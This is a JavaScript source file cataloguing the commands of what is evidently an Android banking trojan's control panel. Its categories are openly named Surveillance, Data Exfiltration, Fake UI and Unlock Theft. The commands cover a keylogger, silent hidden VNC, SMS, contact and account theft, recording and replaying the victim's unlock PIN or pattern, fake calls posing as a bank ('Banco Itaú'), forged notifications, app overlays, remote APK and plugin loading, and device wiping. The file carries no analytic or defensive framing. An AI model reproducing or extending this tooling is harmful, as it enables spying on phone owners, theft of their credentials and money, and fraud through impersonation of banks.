/* commands.js — 138 commands, fully catalogued */
'use strict';

const CMD_CATALOG = [
  // ── Screen Control ─────────────────────────────────────────────────────────
  {
    cat: 'Screen Control', color: '#7c6af7', icon: '📺',
    cmds: [
      { cmd: 'START_VNC',             label: 'Start VNC',           args: [] },
      { cmd: 'STOP_VNC',              label: 'Stop VNC',            args: [] },
      { cmd: 'TOGGLE_VNC',            label: 'Toggle VNC',          args: [] },
      { cmd: 'FORCE_RESTART_VNC',     label: 'Force Restart VNC',   args: [] },
      { cmd: 'REQUEST_VNC_FRAME',     label: 'Request Frame',       args: [] },
      { cmd: 'START_SILENT_VNC',      label: 'Start Silent VNC',    args: [] },
      { cmd: 'STOP_SILENT_VNC',       label: 'Stop Silent VNC',     args: [] },
      { cmd: 'TOGGLE_SILENT_VNC',     label: 'Toggle Silent VNC',   args: [] },
      { cmd: 'SET_VNC_MODE',          label: 'Set VNC Mode',        args: [{ key: 'mode', type: 'text', hint: 'silent|full' }] },
      { cmd: 'SET_SILENT_VNC_QUALITY',label: 'Set HVNC Quality',    args: [{ key: 'quality', type: 'number', hint: '10-100', def: '50' }] },
      { cmd: 'SNAP_SCREEN',           label: 'Snap Screenshot',     args: [] },
      { cmd: 'TRIGGER_SNAP_SCREEN',   label: 'Trigger Snap Screen', args: [] },
    ]
  },
  // ── Gesture Injection ─────────────────────────────────────────────────────
  {
    cat: 'Gesture Injection', color: '#4a9de0', icon: '👆',
    cmds: [
      { cmd: 'TAP',         label: 'Tap',         args: [{ key: 'x', type: 'number', hint: 'X', def: '540' }, { key: 'y', type: 'number', hint: 'Y', def: '960' }] },
      { cmd: 'CLICK',       label: 'Click',       args: [{ key: 'x', type: 'number', hint: 'X', def: '540' }, { key: 'y', type: 'number', hint: 'Y', def: '960' }] },
      { cmd: 'LONG_PRESS',  label: 'Long Press',  args: [{ key: 'x', type: 'number', hint: 'X', def: '540' }, { key: 'y', type: 'number', hint: 'Y', def: '960' }] },
      { cmd: 'SWIPE',       label: 'Swipe',       args: [
        { key: 'x1', type: 'number', hint: 'X1', def: '540' },
        { key: 'y1', type: 'number', hint: 'Y1', def: '1600' },
        { key: 'x2', type: 'number', hint: 'X2', def: '540' },
        { key: 'y2', type: 'number', hint: 'Y2', def: '400' },
        { key: 'duration', type: 'number', hint: 'ms', def: '300' }
      ]},
      { cmd: 'TYPE',        label: 'Type Text',   args: [{ key: 'text', type: 'text', hint: 'text to type' }] },
      { cmd: 'PATH_GESTURE',label: 'Path Gesture',args: [{ key: 'path', type: 'text', hint: '[[x,y],...]' }] },
      { cmd: 'BACK',        label: 'Back',         args: [] },
      { cmd: 'HOME',        label: 'Home',         args: [] },
      { cmd: 'RECENTS',     label: 'Recents',      args: [] },
      { cmd: 'QUICK_SETTINGS', label: 'Quick Settings', args: [] },
      { cmd: 'POWER_MENU',  label: 'Power Menu',   args: [] },
    ]
  },
  // ── Device Control ────────────────────────────────────────────────────────
  {
    cat: 'Device Control', color: '#3dba7a', icon: '⚙️',
    cmds: [
      { cmd: 'SET_VOLUME',       label: 'Set Volume',        args: [{ key: 'volume', type: 'number', hint: '0-15', def: '5' }, { key: 'stream', type: 'number', hint: 'stream type', def: '3' }] },
      { cmd: 'VOLUME_UP',        label: 'Volume Up',         args: [] },
      { cmd: 'VOLUME_DOWN',      label: 'Volume Down',       args: [] },
      { cmd: 'VIBRATE',          label: 'Vibrate',           args: [{ key: 'duration', type: 'number', hint: 'ms', def: '500' }] },
      { cmd: 'SET_BRIGHTNESS',   label: 'Set Brightness',    args: [{ key: 'brightness', type: 'number', hint: '0-255', def: '128' }] },
      { cmd: 'SET_TORCH',        label: 'Set Torch',         args: [{ key: 'on', type: 'text', hint: 'true|false', def: 'true' }] },
      { cmd: 'TOGGLE_TORCH',     label: 'Toggle Torch',      args: [] },
      { cmd: 'SET_WIFI',         label: 'Set WiFi',          args: [{ key: 'enabled', type: 'text', hint: 'true|false', def: 'true' }] },
      { cmd: 'TOGGLE_WIFI',      label: 'Toggle WiFi',       args: [] },
      { cmd: 'SET_RINGER_MODE',  label: 'Set Ringer Mode',   args: [{ key: 'mode', type: 'number', hint: '0=silent 1=vibrate 2=normal', def: '2' }] },
      { cmd: 'SET_SOUND_MODE',   label: 'Set Sound Mode',    args: [{ key: 'mode', type: 'text', hint: 'silent|vibrate|normal' }] },
      { cmd: 'RINGER_MODE',      label: 'Ringer Mode',       args: [{ key: 'mode', type: 'number', hint: '0-2', def: '0' }] },
      { cmd: 'SET_SCREEN_TIMEOUT', label: 'Set Screen Timeout', args: [{ key: 'ms', type: 'number', hint: 'milliseconds', def: '30000' }] },
      { cmd: 'SCREEN_ON',        label: 'Screen On',         args: [] },
      { cmd: 'WAKE',             label: 'Wake',              args: [] },
      { cmd: 'WAKEUP',           label: 'Wakeup',            args: [] },
      { cmd: 'WAKE_UP',          label: 'Wake Up',           args: [] },
      { cmd: 'POWER',            label: 'Power',             args: [] },
      { cmd: 'LOCK_DEVICE',      label: 'Lock Device',       args: [] },
      { cmd: 'HIDE_LOCKSCREEN',  label: 'Hide Lock Screen',  args: [] },
      { cmd: 'SHOW_LOCKSCREEN',  label: 'Show Lock Screen',  args: [] },
      { cmd: 'SCREEN_PERSISTENCE', label: 'Screen Persistence', args: [{ key: 'enabled', type: 'text', hint: 'true|false', def: 'true' }] },
    ]
  },
  // ── Surveillance ──────────────────────────────────────────────────────────
  {
    cat: 'Surveillance', color: '#e0b84a', icon: '📷',
    cmds: [
      { cmd: 'TOGGLE_CAMERA',     label: 'Toggle Camera',     args: [] },
      { cmd: 'SWITCH_CAMERA',     label: 'Switch Camera',     args: [{ key: 'facing', type: 'text', hint: 'front|back', def: 'front' }] },
      { cmd: 'TOGGLE_MICROPHONE', label: 'Toggle Microphone', args: [] },
      { cmd: 'TOGGLE_KEYLOGGER',  label: 'Toggle Keylogger',  args: [] },
      { cmd: 'GET_LOCATION',      label: 'Get Location',      args: [] },
      { cmd: 'GET_SMS',           label: 'Get SMS',           args: [] },
      { cmd: 'GET_SMS_LIST',      label: 'Get SMS List',      args: [] },
      { cmd: 'GET_CONTACTS',      label: 'Get Contacts',      args: [] },
      { cmd: 'GET_CLIPBOARD',     label: 'Get Clipboard',     args: [] },
      { cmd: 'INJECT_CLIPBOARD',  label: 'Inject Clipboard',  args: [{ key: 'text', type: 'text', hint: 'clipboard content' }] },
      { cmd: 'SET_CLIPBOARD',     label: 'Set Clipboard',     args: [{ key: 'text', type: 'text', hint: 'content' }] },
    ]
  },
  // ── Data Exfiltration ─────────────────────────────────────────────────────
  {
    cat: 'Data Exfiltration', color: '#e07a4a', icon: '📤',
    cmds: [
      { cmd: 'GET_DEVICE_INFO',     label: 'Get Device Info',     args: [] },
      { cmd: 'GET_INSTALLED_APPS',  label: 'Get Installed Apps',  args: [] },
      { cmd: 'GET_ACCOUNTS',        label: 'Get Accounts',        args: [] },
      { cmd: 'GET_GOOGLE_ACCOUNTS', label: 'Get Google Accounts', args: [] },
      { cmd: 'REFRESH_ACCOUNTS',    label: 'Refresh Accounts',    args: [] },
      { cmd: 'GET_FILES',           label: 'Get Files',           args: [] },
      { cmd: 'GET_FILE_LIST',       label: 'Get File List',       args: [{ key: 'path', type: 'text', hint: '/sdcard/', def: '/sdcard/' }] },
      { cmd: 'FILE_LIST',           label: 'File List',           args: [{ key: 'path', type: 'text', hint: 'path', def: '/sdcard/' }] },
      { cmd: 'SEND_SMS',            label: 'Send SMS',            args: [{ key: 'number', type: 'text', hint: 'phone' }, { key: 'message', type: 'text', hint: 'text' }] },
      { cmd: 'MAKE_CALL',           label: 'Make Call',           args: [{ key: 'number', type: 'text', hint: 'phone' }] },
      { cmd: 'CALL_PHONE',          label: 'Call Phone',          args: [{ key: 'number', type: 'text', hint: 'phone' }] },
      { cmd: 'DIAL',                label: 'Dial',                args: [{ key: 'number', type: 'text', hint: 'phone' }] },
      { cmd: 'DIAL_PHONE',          label: 'Dial Phone',          args: [{ key: 'number', type: 'text', hint: 'phone' }] },
    ]
  },
  // ── App Management ────────────────────────────────────────────────────────
  {
    cat: 'App Management', color: '#9d4ae0', icon: '📱',
    cmds: [
      { cmd: 'OPEN_APP',             label: 'Open App',             args: [{ key: 'package', type: 'text', hint: 'com.example.app' }] },
      { cmd: 'FORCE_STOP',           label: 'Force Stop',           args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'FORCE_STOP_APP',       label: 'Force Stop App',       args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'STOP_APP',             label: 'Stop App',             args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'INSTALL_APK',          label: 'Install APK',          args: [{ key: 'url', type: 'text', hint: 'apk url' }] },
      { cmd: 'DELETE_APP',           label: 'Delete App',           args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'UNINSTALL',            label: 'Uninstall',            args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'UNINSTALL_APP',        label: 'Uninstall App',        args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'DUPLICATE_APP',        label: 'Duplicate App',        args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'SHOW_APP_UNAVAILABLE', label: 'Show App Unavailable', args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'TOGGLE_BLOCK_APP',     label: 'Toggle Block App',     args: [{ key: 'package', type: 'text', hint: 'package name' }] },
      { cmd: 'SET_BLOCKED_APPS',     label: 'Set Blocked Apps',     args: [{ key: 'packages', type: 'text', hint: '["pkg1","pkg2"]' }] },
    ]
  },
  // ── Fake UI ───────────────────────────────────────────────────────────────
  {
    cat: 'Fake UI', color: '#e04a4a', icon: '🎭',
    cmds: [
      { cmd: 'FAKE_CALL',             label: 'Fake Call',             args: [{ key: 'name', type: 'text', hint: 'Caller name', def: 'Banco Itaú' }, { key: 'bank', type: 'text', hint: 'bank name' }] },
      { cmd: 'START_FAKE_CALL',       label: 'Start Fake Call',       args: [{ key: 'name', type: 'text', hint: 'Caller name' }] },
      { cmd: 'CANCEL_FAKE_CALL',      label: 'Cancel Fake Call',      args: [] },
      { cmd: 'END_FAKE_CALL',         label: 'End Fake Call',         args: [] },
      { cmd: 'TRIGGER_FAKE_CALL',     label: 'Trigger Fake Call',     args: [{ key: 'name', type: 'text', hint: 'Caller name' }] },
      { cmd: 'FAKE_NOTIFICATION',     label: 'Fake Notification',     args: [{ key: 'app', type: 'text', hint: 'app name' }, { key: 'title', type: 'text', hint: 'title' }, { key: 'text', type: 'text', hint: 'body' }] },
      { cmd: 'FORGE_NOTIFICATION',    label: 'Forge Notification',    args: [{ key: 'app', type: 'text' }, { key: 'title', type: 'text' }, { key: 'text', type: 'text' }] },
      { cmd: 'SEND_FAKE_NOTIFICATION',label: 'Send Fake Notification',args: [{ key: 'app', type: 'text' }, { key: 'title', type: 'text' }, { key: 'text', type: 'text' }] },
      { cmd: 'TRIGGER_FAKE_NOTIFICATION', label: 'Trigger Fake Notification', args: [{ key: 'app', type: 'text' }, { key: 'title', type: 'text' }, { key: 'text', type: 'text' }] },
      { cmd: 'SHOW_NOTIFICATION',     label: 'Show Notification',     args: [{ key: 'title', type: 'text' }, { key: 'text', type: 'text' }] },
      { cmd: 'NOTIFICATIONS',         label: 'Notifications',         args: [] },
    ]
  },
  // ── Black Screen ──────────────────────────────────────────────────────────
  {
    cat: 'Black Screen', color: '#444466', icon: '⬛',
    cmds: [
      { cmd: 'BLACK_SCREEN_ON',          label: 'Black Screen On',          args: [] },
      { cmd: 'BLACK_SCREEN_OFF',         label: 'Black Screen Off',         args: [] },
      { cmd: 'TOGGLE_BLACK_SCREEN',      label: 'Toggle Black Screen',      args: [] },
      { cmd: 'CUSTOM_BLACK_SCREEN',      label: 'Custom Black Screen',      args: [{ key: 'html', type: 'text', hint: 'HTML content' }] },
      { cmd: 'SET_BLACK_SCREEN_OPACITY', label: 'Set Black Screen Opacity', args: [{ key: 'opacity', type: 'number', hint: '0-255', def: '255' }] },
      { cmd: 'TOGGLE_BLACK_SCREEN_TOUCH',label: 'Toggle Touch Block',       args: [] },
      { cmd: 'SET_TOUCH_BLOCK',          label: 'Set Touch Block',          args: [{ key: 'blocked', type: 'text', hint: 'true|false', def: 'true' }] },
      { cmd: 'TOGGLE_TOUCH_BLOCK',       label: 'Toggle Touch Block',       args: [] },
    ]
  },
  // ── Unlock Theft ──────────────────────────────────────────────────────────
  {
    cat: 'Unlock Theft', color: '#e0b84a', icon: '🔓',
    cmds: [
      { cmd: 'START_UNLOCK_RECORDING', label: 'Start Unlock Recording', args: [] },
      { cmd: 'STOP_UNLOCK_RECORDING',  label: 'Stop Unlock Recording',  args: [] },
      { cmd: 'PLAY_UNLOCK_SEQUENCE',   label: 'Play Unlock Sequence',   args: [] },
      { cmd: 'PLAY_PATTERN_SEQUENCE',  label: 'Play Pattern Sequence',  args: [] },
      { cmd: 'PLAY_PIN_SEQUENCE',      label: 'Play PIN Sequence',      args: [] },
      { cmd: 'PATTERN_UNLOCK',         label: 'Pattern Unlock',         args: [{ key: 'pattern', type: 'text', hint: '[0,4,8,...]' }] },
      { cmd: 'LOCK_KEY_PRESS',         label: 'Lock Key Press',         args: [{ key: 'key', type: 'text', hint: 'key value' }] },
    ]
  },
  // ── System ────────────────────────────────────────────────────────────────
  {
    cat: 'System', color: '#3dba7a', icon: '🖥️',
    cmds: [
      { cmd: 'PING',                        label: 'Ping',                        args: [] },
      { cmd: 'RECONNECT_CONNECTION',        label: 'Reconnect',                   args: [] },
      { cmd: 'GET_DEVICE_INFO',             label: 'Get Device Info',             args: [] },
      { cmd: 'CHECK_ADMIN_STATUS',          label: 'Check Admin Status',          args: [] },
      { cmd: 'CHECK_PERMISSIONS',           label: 'Check Permissions',           args: [] },
      { cmd: 'REQUEST_ADMIN_PERMISSION',    label: 'Request Admin Permission',    args: [] },
      { cmd: 'REQUEST_PERMISSION',          label: 'Request Permission',          args: [{ key: 'permission', type: 'text', hint: 'android.permission.CAMERA' }] },
      { cmd: 'REQUEST_OVERLAY_PERMISSION',  label: 'Request Overlay Permission',  args: [] },
      { cmd: 'REQUEST_IGNORE_BATTERY',      label: 'Request Ignore Battery',      args: [] },
      { cmd: 'CONFIGURE_ROM',              label: 'Configure ROM',               args: [] },
      { cmd: 'OPEN_SETTINGS',              label: 'Open Settings',               args: [] },
      { cmd: 'STEALTH_STATUS',             label: 'Stealth Status',              args: [] },
      { cmd: 'SET_THREAT_LEVEL',           label: 'Set Threat Level',            args: [{ key: 'level', type: 'number', hint: '0-3', def: '0' }] },
      { cmd: 'TOGGLE_BOT_OPTION',          label: 'Toggle Bot Option',           args: [{ key: 'option', type: 'text', hint: 'option name' }] },
      { cmd: 'TOGGLE_KILLER_MODE',         label: 'Toggle Killer Mode',          args: [] },
      { cmd: 'TOGGLE_SCREEN_READER',       label: 'Toggle Screen Reader',        args: [] },
      { cmd: 'FORMAT_DEVICE',              label: '⚠ Format Device',            args: [{ key: 'confirm', type: 'text', hint: 'CONFIRM', def: '' }] },
      { cmd: 'SELF_DESTRUCT',              label: '💀 Self Destruct',           args: [] },
    ]
  },
  // ── Plugins ───────────────────────────────────────────────────────────────
  {
    cat: 'Plugins', color: '#4a7de0', icon: '🔌',
    cmds: [
      { cmd: 'LOAD_PLUGIN',   label: 'Load Plugin',   args: [{ key: 'url', type: 'text', hint: 'plugin url' }] },
      { cmd: 'UNLOAD_PLUGIN', label: 'Unload Plugin', args: [{ key: 'name', type: 'text', hint: 'plugin name' }] },
      { cmd: 'LIST_PLUGINS',  label: 'List Plugins',  args: [] },
      { cmd: 'EXEC_PLUGIN',   label: 'Exec Plugin',   args: [{ key: 'name', type: 'text', hint: 'plugin name' }, { key: 'data', type: 'text', hint: 'json data', def: '{}' }] },
    ]
  },
  // ── Overlay Mapping ───────────────────────────────────────────────────────
  {
    cat: 'Overlay Mapping', color: '#e04a9d', icon: '🗺️',
    cmds: [
      { cmd: 'ARM_OVERLAY_MAPPING',    label: 'Arm Overlay Mapping',    args: [{ key: 'package', type: 'text', hint: 'target package' }, { key: 'config', type: 'text', hint: 'JSON config' }] },
      { cmd: 'DISARM_OVERLAY_MAPPING', label: 'Disarm Overlay Mapping', args: [{ key: 'package', type: 'text', hint: 'target package' }] },
      { cmd: 'DELETE_OVERLAY_MAPPING', label: 'Delete Overlay Mapping', args: [{ key: 'package', type: 'text', hint: 'target package' }] },
    ]
  },
];

// Flat lookup map: cmd string → catalog entry
const CMD_MAP = new Map();
CMD_CATALOG.forEach(cat => cat.cmds.forEach(c => CMD_MAP.set(c.cmd, { ...c, cat: cat.cat, color: cat.color })));

// Quick commands shown on device cards
const QUICK_CMDS = [
  { label: 'Ping',     cmd: 'PING',              args: {} },
  { label: 'Info',     cmd: 'GET_DEVICE_INFO',   args: {} },
  { label: 'Location', cmd: 'GET_LOCATION',       args: {} },
  { label: 'SMS',      cmd: 'GET_SMS_LIST',       args: {} },
  { label: 'Contacts', cmd: 'GET_CONTACTS',       args: {} },
  { label: 'Accounts', cmd: 'GET_ACCOUNTS',       args: {} },
  { label: 'Apps',     cmd: 'GET_INSTALLED_APPS', args: {} },
  { label: 'Keylog',   cmd: 'TOGGLE_KEYLOGGER',   args: {} },
  { label: 'Snap',     cmd: 'SNAP_SCREEN',        args: {} },
  { label: 'HVNC',     cmd: 'START_SILENT_VNC',   args: {} },
  { label: 'Home',     cmd: 'HOME',               args: {} },
  { label: 'Back',     cmd: 'BACK',               args: {} },
  { label: 'Lock',     cmd: 'LOCK_DEVICE',        args: {} },
  { label: 'Wake',     cmd: 'WAKE',               args: {} },
  { label: '⬛ Black', cmd: 'BLACK_SCREEN_ON',    args: {} },
  { label: '✦ White',  cmd: 'BLACK_SCREEN_OFF',   args: {} },
];
